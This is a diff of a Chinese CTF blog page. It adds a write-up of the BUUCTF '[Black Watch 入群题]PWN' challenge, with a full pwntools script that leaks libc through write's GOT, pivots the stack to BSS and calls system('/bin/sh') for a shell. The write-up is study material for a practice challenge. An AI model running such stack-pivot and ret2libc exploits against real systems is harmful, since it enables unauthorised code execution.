@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://shmodifier.github.io/img/%E5%A4%8D%E5%81%A5/%E9%A1%B5%E9%A6%96%E5%9B%BE2.jpg">
 <meta property="article:published_time" content="2024-03-24T11:17:00.000Z">
-<meta property="article:modified_time" content="2024-03-24T11:32:10.289Z">
+<meta property="article:modified_time" content="2024-03-24T12:54:27.239Z">
 <meta property="article:author" content="Modifier">
 <meta property="article:tag" content="格式化字符串">
 <meta property="article:tag" content="heap">
@@ -239,7 +239,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          17k 字
+          18k 字
         
       </span>
     
@@ -250,7 +250,7 @@
         
         
         
-          142 分钟
+          152 分钟
         
       </span>
     
@@ -446,8 +446,14 @@
 
 
 
+<h3 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h3><p>主要的漏洞代码如下：</p>
+<p>![](&#x2F;img&#x2F;复健&#x2F;[Black Watch 入群题]PWN-read.png)</p>
+<p>这其中 s 被存储在 BSS 段，我们可以控制输入 0X200 长度的字符。接下来第二个 read 只能读入 0x20 长度，buf 就有 0x18 。</p>
+<p>所以我们可以将 rop 链构造在 .BSS 段上，再通过第二个 read 控制程序跳转到此处执行 shellcode 。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>sh=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>vuln= <span class="hljs-number">0x0804849B</span><br>bss=<span class="hljs-number">0x0804A300</span><br>leave_ret=<span class="hljs-number">0x08048408</span><br>write_plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br>write_got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<br><br>payload1=p32(write_plt)+p32(vuln)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>)<br>sh.sendline(payload1)<br><br>sh.recvuntil(<span class="hljs-string">&quot;say?&quot;</span>)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p32(bss-<span class="hljs-number">4</span>)+p32(leave_ret)<br>sh.sendline(payload2)<br>write_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_addr))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write_addr) <br>base=write_addr-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)   <br>bin_sh=base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>)<br>payload1=p32(system)+p32(<span class="hljs-number">0</span>)+p32(bin_sh)<br>sh.sendline(payload1)<br><br>sh.recvuntil(<span class="hljs-string">&quot;say?&quot;</span>)<br>sh.sendline(payload2)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
 
-
+<p>我说你能不能按时检查一下服务器修一修呢 BUUCTF </p>
+<p>![](&#x2F;img&#x2F;复健&#x2F;[Black Watch 入群题]PWN-nc.png)</p>
 <h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h3 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h3><p>函数开启了canary保护</p>
 <p>gift 函数中存在格式化字符串漏洞：</p>
 <p><img src="/img/%E5%A4%8D%E5%81%A5/bjdctf_2020_babyrop2_gift.png" srcset="/img/loading.gif" lazyload></p>
